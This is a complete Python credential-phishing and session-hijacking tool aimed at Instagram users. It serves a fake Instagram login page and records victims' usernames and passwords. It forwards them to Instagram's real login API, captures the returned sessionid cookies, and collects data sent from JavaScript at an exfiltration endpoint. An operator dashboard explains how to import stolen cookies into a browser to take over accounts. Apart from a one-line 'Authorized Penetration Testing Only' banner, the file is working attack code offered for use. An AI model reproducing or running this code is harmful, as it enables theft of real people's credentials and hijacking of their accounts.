import urllib3
import os
import sys
import json
import re
import socket
import logging
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
import ssl

import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
LOG_FILE = "captured_sessions.json"
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8080

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("ig_proxy.log"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger(__name__)

# Global session store
session_store = {
    "session_ids": [],
    "cookies": [],
    "credentials": [],
}

if os.path.exists(LOG_FILE):
    try:
        with open(LOG_FILE, "r") as f:
            session_store = json.load(f)
    except:
        pass


def save():
    with open(LOG_FILE, "w") as f:
        json.dump(session_store, f, indent=2)


def highlight(msg):
    """Print a highlighted message to the terminal."""
    print(f"\n{'='*60}")
    print(f"  {msg}")
    print(f"{'='*60}\n")


# ------------------------------------------------------------
# Custom HTTP adapter that preserves RAW response headers
# ------------------------------------------------------------
class RawHeaderAdapter(requests.adapters.HTTPAdapter):
    """Adapter that ensures raw headers are accessible."""
    def send(self, *args, **kwargs):
        return super().send(*args, **kwargs)


# Create a session that preserves everything
session = requests.Session()
session.verify = False
session.mount("https://", RawHeaderAdapter())


class InstagramProxy(BaseHTTPRequestHandler):
    """HTTP proxy that captures Instagram's raw response headers."""

    def log_message(self, format, *args):
        pass

    # ------------------------------------------------------------
    # Handle all HTTP methods
    # ------------------------------------------------------------
    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    def do_HEAD(self):
        self._handle()

    def do_OPTIONS(self):
        self._handle()

    def do_CONNECT(self):
        """Handle HTTPS CONNECT - we redirect them to use our HTTP proxy."""
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Use HTTP proxy instead.")

    # ------------------------------------------------------------
    # Main handler
    # ------------------------------------------------------------
    def _handle(self):
        path = self.path

        # Internal endpoints
        if path == "/" or path == "/index.html":
            return self._serve_login_page()
        elif path.startswith("/_sessions"):
            return self._show_sessions()
        elif path.startswith("/_export"):
            return self._export_sessions()
        elif path.startswith("/_clear"):
            return self._clear_sessions()
        elif path.startswith("/_exfil"):
            return self._handle_exfil()
        elif path.startswith("/login") or path.startswith("/accounts/login"):
            return self._handle_login()
        else:
            return self._proxy_to_instagram()

    # ------------------------------------------------------------
    # Login page served to the victim
    # ------------------------------------------------------------
    def _serve_login_page(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.end_headers()

        html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { max-width:350px; width:100%; padding:20px; }
.login-card { background:#fff; border:1px solid #dbdbdb; border-radius:1px; padding:40px 30px; margin-bottom:10px; }
.logo { text-align:center; margin-bottom:30px; font-size:36px; }
input[type="text"], input[type="password"] { width:100%; padding:12px 10px; margin-bottom:6px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; font-size:14px; outline:none; }
input:focus { border-color:#a8a8a8; }
button { width:100%; padding:10px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:600; font-size:14px; cursor:pointer; margin-top:10px; }
button:hover { background:#1877f2; }
.separator { display:flex; align-items:center; margin:20px 0; color:#8e8e8e; font-size:13px; }
.separator::before, .separator::after { content:''; flex:1; height:1px; background:#dbdbdb; }
.separator span { padding:0 18px; }
.signup { background:#fff; border:1px solid #dbdbdb; padding:20px; text-align:center; font-size:14px; }
.signup a { color:#0095f6; font-weight:600; text-decoration:none; }
</style>
</head>
<body>
<div class="container">
    <div class="login-card">
        <div class="logo">Instagram</div>
        <form method="POST" action="/login" id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off">
            <input type="password" name="password" placeholder="Password" required autocomplete="off">
            <button type="submit">Log in</button>
        </form>
        <div class="separator"><span>OR</span></div>
        <div style="text-align:center;font-size:14px;color:#385185;font-weight:600;margin-bottom:15px;">Log in with Facebook</div>
        <div style="text-align:center;font-size:12px;"><a href="#" style="color:#00376b;text-decoration:none;">Forgot password?</a></div>
    </div>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>"""
        self.wfile.write(html.encode())

    # ------------------------------------------------------------
    # Handle login - THIS IS WHERE SESSION IS CAPTURED
    # ------------------------------------------------------------
    def _handle_login(self):
        """
        Most important method.
        1. Captures username/password from the form
        2. Forwards to Instagram's REAL login API
        3. Captures the RAW Set-Cookie headers (where sessionid lives)
        4. Saves the sessionid to disk
        """
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        victim_ip = self.client_address[0]

        # Parse form data
        body_str = body.decode("utf-8", errors="replace")
        params = parse_qs(body_str)
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]

        logger.info(f"[LOGIN ATTEMPT] {username}:{password} from {victim_ip}")

        # Save credentials
        if username and password:
            session_store["credentials"].append({
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "password": password,
                "ip": victim_ip,
            })
            save()
            highlight(f"CREDENTIALS: {username}:{password}")

        # --------------------------------------------------------
        # Forward to Instagram's real login API
        # --------------------------------------------------------
        user_agent = self.headers.get(
            "User-Agent",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        )

        try:
            # Step 1: Get a csrftoken from Instagram's login page
            logger.info("[*] Getting csrftoken from Instagram...")
            login_page = session.get(
                "https://www.instagram.com/accounts/login/",
                headers={
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                },
                timeout=15,
            )

            # Extract csrftoken from raw Set-Cookie headers
            csrftoken = None
            all_cookies = {}

            # Method 1: Check raw headers
            if hasattr(login_page.raw, 'headers') and hasattr(login_page.raw.headers, 'get_all'):
                raw_cookies = login_page.raw.headers.get_all("Set-Cookie")
                logger.info(f"[DEBUG] Raw Set-Cookie from login page: {raw_cookies}")
                for rc in raw_cookies:
                    # Extract cookie name and value
                    m = re.match(r'^([^=]+)=([^;]+)', rc)
                    if m:
                        name, val = m.group(1), m.group(2)
                        all_cookies[name] = val
                        if name == "csrftoken":
                            csrftoken = val
                            logger.info(f"[+] csrftoken from raw headers: {csrftoken}")

            # Method 2: Check cookie jar
            if not csrftoken:
                for cookie in login_page.cookies:
                    all_cookies[cookie.name] = cookie.value
                    if cookie.name == "csrftoken":
                        csrftoken = cookie.value
                        logger.info(f"[+] csrftoken from cookie jar: {csrftoken}")

            # Method 3: Check response headers
            if not csrftoken:
                sc = login_page.headers.get("Set-Cookie", "")
                m = re.search(r'csrftoken=([^;]+)', sc)
                if m:
                    csrftoken = m.group(1)
                    logger.info(f"[+] csrftoken from headers: {csrftoken}")

            # Also get mid and ig_did
            mid = all_cookies.get("mid", "")
            ig_did = all_cookies.get("ig_did", "")

            # Fallback: generate a csrftoken if we couldn't get one
            if not csrftoken:
                import hashlib
                csrftoken = hashlib.md5(os.urandom(16)).hexdigest()
                logger.warning(f"[!] Generated fallback csrftoken: {csrftoken}")

            # Step 2: Make the login request
            logger.info("[*] Submitting login to Instagram...")

            # Encrypt password the way Instagram expects
            timestamp = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

            login_data = {
                "username": username,
                "enc_password": enc_password,
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}",
            }

            login_headers = {
                "User-Agent": user_agent,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "X-Instagram-AJAX": "1",
                "X-IG-App-ID": "936619743392459",
                "X-IG-Connection-Type": "WIFI",
                "X-IG-Capabilities": "3brTvw==",
                "X-CSRFToken": csrftoken,
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/accounts/login/",
                "Host": "www.instagram.com",
                "Connection": "keep-alive",
            }

            # Cookies to send with login
            login_cookies = {}
            if csrftoken:
                login_cookies["csrftoken"] = csrftoken
            if mid:
                login_cookies["mid"] = mid
            if ig_did:
                login_cookies["ig_did"] = ig_did

            # Make the login request
            login_resp = session.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                headers=login_headers,
                cookies=login_cookies,
                data=login_data,
                allow_redirects=False,
                timeout=15,
            )

            # --------------------------------------------------------
            # CAPTURE ALL RESPONSE HEADERS (WHERE SESSIONID LIVES)
            # --------------------------------------------------------
            logger.info(f"[DEBUG] Login response status: {login_resp.status_code}")
            logger.info(f"[DEBUG] Login response headers: {dict(login_resp.headers)}")

            # Method 1: Raw headers (MOST RELIABLE for sessionid)
            if hasattr(login_resp.raw, 'headers') and hasattr(login_resp.raw.headers, 'get_all'):
                raw_set_cookies = login_resp.raw.headers.get_all("Set-Cookie")
                logger.info(f"[DEBUG] Raw Set-Cookie from login: {raw_set_cookies}")

                for rc in raw_set_cookies:
                    m = re.match(r'^([^=]+)=([^;]+)', rc)
                    if m:
                        name, value = m.group(1), m.group(2)

                        # Save EVERY cookie
                        cookie_entry = {
                            "name": name,
                            "value": value,
                            "raw_header": rc,
                            "timestamp": datetime.now().isoformat(),
                            "ip": victim_ip,
                            "username": username,
                            "source": "login_response_raw",
                        }
                        session_store["cookies"].append(cookie_entry)

                        # HIGHLIGHT sessionid
                        if name == "sessionid":
                            session_store["session_ids"].append({
                                "sessionid": value,
                                "username": username,
                                "timestamp": datetime.now().isoformat(),
                                "ip": victim_ip,
                                "raw_header": rc,
                            })
                            highlight(f"SESSIONID CAPTURED!\n  User: {username}\n  sessionid: {value}\n  Import this into Cookie-Editor on instagram.com")
                            print(f"  Full raw header: {rc}")

                        logger.info(f"[COOKIE] {name}={value}")

            # Method 2: Cookie jar
            for cookie in login_resp.cookies:
                cookie_entry = {
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "secure": cookie.secure,
                    "timestamp": datetime.now().isoformat(),
                    "ip": victim_ip,
                    "username": username,
                    "source": "cookie_jar",
                }
                session_store["cookies"].append(cookie_entry)

                if cookie.name == "sessionid":
                    session_store["session_ids"].append({
                        "sessionid": cookie.value,
                        "username": username,
                        "timestamp": datetime.now().isoformat(),
                        "ip": victim_ip,
                        "source": "cookie_jar",
                    })
                    highlight(f"SESSIONID CAPTURED from cookie jar!\n  User: {username}\n  sessionid: {cookie.value}")

                logger.info(f"[COOKIE_JAR] {cookie.name}={cookie.value}")

            # Method 3: Header string
            sc_header = login_resp.headers.get("Set-Cookie", "")
            if sc_header:
                logger.info(f"[DEBUG] Set-Cookie header string: {sc_header}")
                for cookie_match in re.finditer(r'([^=]+)=([^;]+)', sc_header):
                    name, value = cookie_match.group(1), cookie_match.group(2)
                    if name == "sessionid":
                        session_store["session_ids"].append({
                            "sessionid": value,
                            "username": username,
                            "timestamp": datetime.now().isoformat(),
                            "ip": victim_ip,
                            "source": "header_string",
                        })
                        highlight(f"SESSIONID CAPTURED from header!\n  User: {username}\n  sessionid: {value}")

            # Try to parse the JSON response
            try:
                resp_json = login_resp.json()
                logger.info(f"[DEBUG] Login JSON response: {resp_json}")
                session_store["login_attempts"].append({
                    "timestamp": datetime.now().isoformat(),
                    "username": username,
                    "response": resp_json,
                    "ip": victim_ip,
                })

                if resp_json.get("authenticated"):
                    highlight(f"LOGIN SUCCESSFUL for {username}!")
                elif resp_json.get("status") == "fail":
                    logger.warning(f"[!] Login failed for {username}: {resp_json.get('message', '')}")
            except:
                logger.info(f"[DEBUG] Raw login response body: {login_resp.text[:200]}")

            save()

            # --------------------------------------------------------
            # Redirect victim to real Instagram
            # --------------------------------------------------------
            self.send_response(302)
            self.send_header("Location", "https://www.instagram.com/")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()

        except Exception as e:
            logger.error(f"[ERROR] Login proxy failed: {e}", exc_info=True)
            # Still redirect them
            self.send_response(302)
            self.send_header("Location", "https://www.instagram.com/")
            self.end_headers()

    # ------------------------------------------------------------
    # Generic Instagram proxy
    # ------------------------------------------------------------
    def _proxy_to_instagram(self):
        """Forward any request to Instagram, capturing response headers."""
        victim_ip = self.client_address[0]
        path = self.path
        method = self.command

        upstream_url = f"https://www.instagram.com{path}"

        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else None

        # Build headers
        headers = {}
        for key in ["User-Agent", "Accept", "Accept-Language", "Accept-Encoding",
                     "Referer", "Origin", "Content-Type", "X-CSRFToken",
                     "X-Instagram-AJAX", "X-IG-App-ID", "X-Requested-With"]:
            val = self.headers.get(key)
            if val:
                headers[key] = val

        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"

        # Get victim cookies
        victim_cookies = {}
        cookie_header = self.headers.get("Cookie", "")
        if cookie_header:
            for pair in cookie_header.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    n, v = pair.split("=", 1)
                    victim_cookies[n.strip()] = v.strip()

        try:
            resp = session.request(
                method, upstream_url,
                headers=headers,
                cookies=victim_cookies,
                data=body,
                allow_redirects=False,
                timeout=15,
            )

            # Capture any Set-Cookie headers from proxied requests
            if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'get_all'):
                raw_sc = resp.raw.headers.get_all("Set-Cookie")
                for rc in raw_sc:
                    m = re.match(r'^([^=]+)=([^;]+)', rc)
                    if m:
                        name, value = m.group(1), m.group(2)
                        if name == "sessionid":
                            session_store["session_ids"].append({
                                "sessionid": value,
                                "timestamp": datetime.now().isoformat(),
                                "ip": victim_ip,
                                "source": f"proxy_{upstream_url}",
                            })
                            highlight(f"SESSIONID captured from proxied request!\n  URL: {upstream_url}\n  sessionid: {value}")
                            save()

            # Build response to victim
            self.send_response(resp.status_code)

            # Forward headers
            skip = {"content-encoding", "content-length", "transfer-encoding", "connection", "keep-alive"}
            for key, value in resp.headers.items():
                if key.lower() not in skip:
                    self.send_header(key, value)

            self.end_headers()
            self.wfile.write(resp.content)

        except Exception as e:
            logger.error(f"[PROXY ERROR] {upstream_url}: {e}")
            try:
                self.send_response(502)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Proxy error: {e}".encode())
            except:
                pass

    # ------------------------------------------------------------
    # Exfiltration endpoint
    # ------------------------------------------------------------
    def _handle_exfil(self):
        query = urlparse(self.path).query
        params = parse_qs(query)
        data = params.get("data", [""])[0]
        if data:
            session_store["cookies"].append({
                "timestamp": datetime.now().isoformat(),
                "name": "js_exfil",
                "value": data,
                "ip": self.client_address[0],
                "source": "javascript",
            })
            save()

        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        gif = b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
        self.wfile.write(gif)

    # ------------------------------------------------------------
    # Session viewer
    # ------------------------------------------------------------
    def _show_sessions(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        html = """<!DOCTYPE html>
<html>
<head>
<title>Captured Instagram Sessions</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:monospace; background:#1e1e1e; color:#d4d4d4; padding:20px; }
h1 { color:#4ec9b0; margin-bottom:20px; }
h2 { color:#ce9178; margin:20px 0 10px; }
.card { background:#2d2d2d; border-radius:8px; padding:15px; margin-bottom:15px; border-left:4px solid #f44747; }
.card.sessionid { border-left-color:#f44747; }
.card.cookie { border-left-color:#1e90ff; }
.card.cred { border-left-color:#ff8c00; }
.label { color:#9cdcfe; }
.value { color:#ce9178; word-break:break-all; }
.ts { color:#6a9955; font-size:12px; }
.howto { background:#1e1e1e; padding:10px; border-radius:4px; margin:10px 0; }
code { background:#3c3c3c; padding:2px 6px; border-radius:3px; }
.actions a { color:#4ec9b0; text-decoration:none; margin-right:15px; }
.actions a:hover { text-decoration:underline; }
button { background:#f44747; color:white; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; }
.clear-btn { background:#f44747; }
.export-btn { background:#4ec9b0; color:black; }
</style>
</head>
<body>
    <h1>Captured Instagram Sessions</h1>
    <div class="actions">
        <a href="/_export">Export JSON</a>
        <a href="/_sessions">Refresh</a>
        <button onclick="fetch('/_clear',{method:'POST'}).then(()=>location.reload())">Clear All</button>
    </div>
"""

        # Show session IDs
        if session_store.get("session_ids"):
            html += "<h2>Session IDs (Import these!)</h2>"
            for sid_entry in reversed(session_store["session_ids"][-20:]):
                sid = sid_entry.get("sessionid", "")
                user = sid_entry.get("username", "Unknown")
                ts = sid_entry.get("timestamp", "")
                html += f"""
                <div class="card sessionid">
                    <div class="ts">{ts}</div>
                    <div><span class="label">User:</span> {user}</div>
                    <div><span class="label">sessionid:</span></div>
                    <div class="value">{sid}</div>
                    <div class="howto">
                        <strong>How to use:</strong><br>
                        1. Install <a href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" style="color:#4ec9b0">Cookie-Editor</a> extension<br>
                        2. Go to <code>https://www.instagram.com</code><br>
                        3. Open Cookie-Editor and click Import<br>
                        4. Add cookie: <code>sessionid = {sid[:30]}...</code><br>
                        5. Add cookie: <code>ds_user_id = (from cookies list)</code><br>
                        6. Refresh the page
                    </div>
                </div>
                """

        # Show all cookies
        if session_store.get("cookies"):
            html += "<h2>All Captured Cookies</h2>"
            for cookie in reversed(session_store["cookies"][-30:]):
                name = cookie.get("name", "")
                value = cookie.get("value", "")
                ts = cookie.get("timestamp", "")
                source = cookie.get("source", "")
                html += f"""
                <div class="card cookie">
                    <div class="ts">{ts} | {source}</div>
                    <div><span class="label">{name}:</span> <span class="value">{value[:100]}</span></div>
                </div>
                """

        # Show credentials
        if session_store.get("credentials"):
            html += "<h2>Credentials</h2>"
            for cred in reversed(session_store["credentials"][-10:]):
                user = cred.get("username", "")
                pw = cred.get("password", "")
                ts = cred.get("timestamp", "")
                ip = cred.get("ip", "")
                html += f"""
                <div class="card cred">
                    <div class="ts">{ts} | {ip}</div>
                    <div><span class="label">Username:</span> {user}</div>
                    <div><span class="label">Password:</span> {pw}</div>
                </div>
                """

        if not session_store.get("session_ids") and not session_store.get("cookies"):
            html += "<p>No sessions captured yet. Send the victim to this server and wait for them to log in.</p>"

        html += f"""
    <br>
    <div class="ts">Log file: {LOG_FILE} | Auto-saves on every capture</div>
</body>
</html>"""
        self.wfile.write(html.encode())

    def _export_sessions(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Disposition",
                         f"attachment; filename=instagram_sessions_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        self.end_headers()
        self.wfile.write(json.dumps(session_store, indent=2).encode())

    def _clear_sessions(self):
        global session_store
        session_store = {"session_ids": [], "cookies": [], "credentials": []}
        save()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"status": "cleared"}).encode())


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    allow_reuse_address = True
    daemon_threads = True


# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
if __name__ == "__main__":
    print(r"""  
  ______________
< hack it bro! >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||   
                 _                  _   _                   
 _ __  _ __ __ _| | _____  ___ _ __| |_| |__    _ __  _   _ 
| '_ \| '__/ _` | |/ / _ \/ _ \ '__| __| '_ \  | '_ \| | | |
| |_) | | | (_| |   <  __/  __/ |  | |_| | | |_| |_) | |_| |
| .__/|_|  \__,_|_|\_\___|\___|_|   \__|_| |_(_) .__/ \__, |
|_|                                            |_|    |___/ 


    Instagram Session Hijacker - Raw Header Capture - insta:prakeerth.py
    ====================================================================
    Authorized Penetration Testing Only

    Captures sessionid from Instagram's raw Set-Cookie headers.
    ===========================================================
    """)

    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"

    print(f"""
    [1] Send victim to: http://{local_ip}:{LISTEN_PORT}

    [2] View sessions:  http://127.0.0.1:{LISTEN_PORT}/_sessions

    [3] Export JSON:    http://127.0.0.1:{LISTEN_PORT}/_export

    [4] Log file:       {os.path.abspath(LOG_FILE)}

    [5] Watch live:     tail -f ig_proxy.log | grep -E "SESSIONID|COOKIE|CREDENTIALS"

    Press Ctrl+C to stop.
    """)

    server = ThreadedHTTPServer((LISTEN_HOST, LISTEN_PORT), InstagramProxy)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.shutdown()
        save()
        print(f"[*] Sessions saved to {os.path.abspath(LOG_FILE)}")

        # Print a summary of captured session IDs
        if session_store.get("session_ids"):
            print(f"\n[*] Captured {len(session_store['session_ids'])} session IDs:")
            for s in session_store["session_ids"]:
                print(f"    - {s.get('username', '?')}: {s.get('sessionid', '')[:50]}...")
        else:
            print("\n[!] No session IDs were captured.")

        print("[*] Done.")
